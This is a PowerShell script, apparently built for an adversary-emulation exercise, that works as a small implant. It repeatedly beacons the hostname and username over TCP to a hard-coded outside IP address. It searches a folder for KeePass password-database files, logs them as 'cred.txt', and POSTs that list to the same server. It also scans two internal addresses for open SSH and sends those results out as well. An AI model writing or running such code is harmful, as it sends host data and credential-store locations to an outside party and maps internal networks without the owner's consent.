$ErrorActionPreference = "Continue"

function Write-ExerciseLog {
    param([string]$Message)

    $entry = "{0} | {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
    Add-Content -Path $logFile -Value $entry
}

function Test-MemoryVolumes {
    $volumes = Get-CimInstance Win32_LogicalDisk |
        Select-Object DeviceID, DriveType, Size, FreeSpace

    Write-ExerciseLog "Volume inventory completed. Count: $($volumes.Count)"
}

function Test-MicrosoftDirectory {
    $paths = @(
        "$env:ProgramFiles\Microsoft",
        "${env:ProgramFiles(x86)}\Microsoft",
        "$env:APPDATA\Microsoft"
    )

    foreach ($path in $paths) {
        if (Test-Path -LiteralPath $path) {
            Write-ExerciseLog "Microsoft directory exists: $path"
        }
        else {
            Write-ExerciseLog "Microsoft directory not found: $path"
        }
    }
}

function Test-TemporaryDirectory {
    $tempPath = $env:TEMP

    if (Test-Path -LiteralPath $tempPath) {
        $count = @(
            Get-ChildItem -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue
        ).Count

        Write-ExerciseLog "Temporary directory checked. Item count: $count"
    }
}

$srv = "4.182.66.115"
$bcnprt = 7777
$httpPort = 8080

$root = "C:\Temp"
$dataFolder = "$root\Data"
$resultFolder = "$root\Results"

New-Item -ItemType Directory -Force -Path $dataFolder | Out-Null
New-Item -ItemType Directory -Force -Path $resultFolder | Out-Null

$marker = "$root\s1.txt"

"Executed: $(Get-Date)" |
    Out-File $marker -Encoding UTF8

$startTime = Get-Date
$endTime = $startTime.AddMinutes(2)

while ((Get-Date) -lt $endTime) {

    try {

        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($srv, $bcnprt)

        $stream = $client.GetStream()

        $message = "HOST=$env:COMPUTERNAME|USER=$env:USERNAME|TIME=$(Get-Date)"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($message)

        $stream.Write($bytes, 0, $bytes.Length)

        $stream.Close()
        $client.Close()
    }
    catch {}

    $remaining = $endTime - (Get-Date)

    if ($remaining.TotalSeconds -le 0) {
        break
    }

    $sleepSeconds = [Math]::Min(60, [Math]::Ceiling($remaining.TotalSeconds))

    Start-Sleep -Seconds $sleepSeconds
}

$discoveryLog = "$resultFolder\cred.txt"

"=== FILE DISCOVERY ===" |
    Out-File $discoveryLog -Encoding UTF8

"Timestamp: $(Get-Date)" |
    Add-Content $discoveryLog

"Hostname: $env:COMPUTERNAME" |
    Add-Content $discoveryLog

"Username: $env:USERNAME" |
    Add-Content $discoveryLog

Get-ChildItem `
    -Path $dataFolder `
    -Recurse `
    -File `
    -Filter "*.kdbx" `
    -ErrorAction SilentlyContinue |
    ForEach-Object {

        "NAME: $($_.Name)" |
            Add-Content $discoveryLog

        "PATH: $($_.FullName)" |
            Add-Content $discoveryLog

        "SIZE: $($_.Length)" |
            Add-Content $discoveryLog

        "MODIFIED: $($_.LastWriteTime)" |
            Add-Content $discoveryLog

        "" |
            Add-Content $discoveryLog
    }


try {
    $body = Get-Content $discoveryLog -Raw

    Invoke-WebRequest `
        -Uri "http://${srv}:${httpPort}" `
        -Method POST `
        -Body $body `
        -ContentType "text/plain" `
        -UseBasicParsing `
}
catch {
    Write-Host "Chyba: $($_.Exception.Message)"
}

$scanResult = "$resultFolder\scan.txt"

"=== NETWORK DISCOVERY ===" |
    Out-File $scanResult -Encoding UTF8

"Timestamp: $(Get-Date)" |
    Add-Content $scanResult

"Port: 22" |
    Add-Content $scanResult

"" |
    Add-Content $scanResult

$ips = @(
    "192.168.0.1",
    "192.168.0.2"
)

foreach ($ip in $ips) {
    $client = New-Object System.Net.Sockets.TcpClient

    try {
        $async = $client.BeginConnect($ip, 22, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(1500, $false)

        if ($connected -and $client.Connected) {
            "$ip`:22 OPEN" | Add-Content $scanResult
        }
        else {
            "$ip`:22 CLOSED/UNREACHABLE" | Add-Content $scanResult
        }

        if ($connected) {
            $client.EndConnect($async)
        }
    }
    catch {
        "$ip`:22 CLOSED/UNREACHABLE" | Add-Content $scanResult
    }
    finally {
        $client.Close()
    }

    Start-Sleep -Milliseconds 250
}

try {
    $body = Get-Content $scanResult -Raw

    Invoke-WebRequest `
        -Uri "http://${srv}:${httpPort}" `
        -Method POST `
        -Body $body `
        -ContentType "text/plain" `
        -UseBasicParsing `
}
catch {
    Write-Host "Chyba: $($_.Exception.Message)"
}
